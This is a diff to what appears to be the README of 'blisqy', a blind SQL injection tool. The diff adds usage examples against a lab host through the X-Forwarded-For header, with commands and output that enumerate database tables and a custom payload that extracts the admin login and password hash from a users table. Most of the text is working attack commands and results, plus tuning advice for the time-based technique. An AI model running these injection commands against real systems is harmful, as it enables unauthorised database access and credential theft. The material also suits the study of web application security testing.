@@ -40,7 +40,7 @@ In other words, this argument is set.
 **Vulnerable header is "X-Forwarded-For" and using --dig will enumerate the MySQL DB but takes time**
 
 ```bash
-./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" --dig yes  
+./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" --dig yes --sleeptime 0.9
 [+] Getting Current Database : 
 [-] photoblog
 
@@ -62,8 +62,63 @@ Preparing to get  all Columns in Table : categories .
 
 
 [+] Getting   Number of Columns in a categories .
+[-] 2
+[+] Getting  all Column Names in Table : categories .
+id
+title
+Number of Rows on Table : categories 
+3
+Preparing to get  all Columns in Table : pictures .
+=====================================================
+
+
+[+] Getting   Number of Columns in a pictures .
+[-] 4
+[+] Getting  all Column Names in Table : pictures .
+cat
+id
+img
+title
+Number of Rows on Table : pictures 
+3
+Preparing to get  all Columns in Table : stats .
+=====================================================
+
+
+[+] Getting   Number of Columns in a stats .
+[-] 2
+[+] Getting  all Column Names in Table : stats .
+count
+ip
+Number of Rows on Table : stats 
+1
+Preparing to get  all Columns in Table : users .
+=====================================================
+
+
+[+] Getting   Number of Columns in a users .
+[-] 3
+[+] Getting  all Column Names in Table : users .
+id
+login
+password
+Number of Rows on Table : users 
+1
 
 ```
+**With the above knowledge craft a niffty custom payload**
+```bash
+./blisqy.py --server 192.168.56.101 --port 80 --header X-Forwarded-For --hvalue "lol"  
+            --payload "select concat(id,':',login,':',password) from users order by id desc limit 1"  
+            --sleeptime 0.9
+
+Extracting Data from ====> 192.168.56.101 : 80 
+Current Payload : select concat(id,':',login,':',password) from users order by id desc limit 1
+==================================================================
+
+1:admin:8efe310f9ab3efeae8d410a8e0166eb2
+```
+
 **Vulnerable header is "X-Forwarded-For" and using --payload will run a custom SQL query on the MySQL DB**
 ```bash
 ./blisqy.py --server 192.168.56.101 --port 80 --header X-Forwarded-For --hvalue "lol"  
@@ -74,4 +129,7 @@ Current Payload : select @@hostname
 ==================================================================
 debian
 ```
+
+## Very Imporntant
+Always make sure you have fine tuned the `--sleeptime` to a value that resonates with your environment and network lantency.... Otherwise you'll be toased!
 
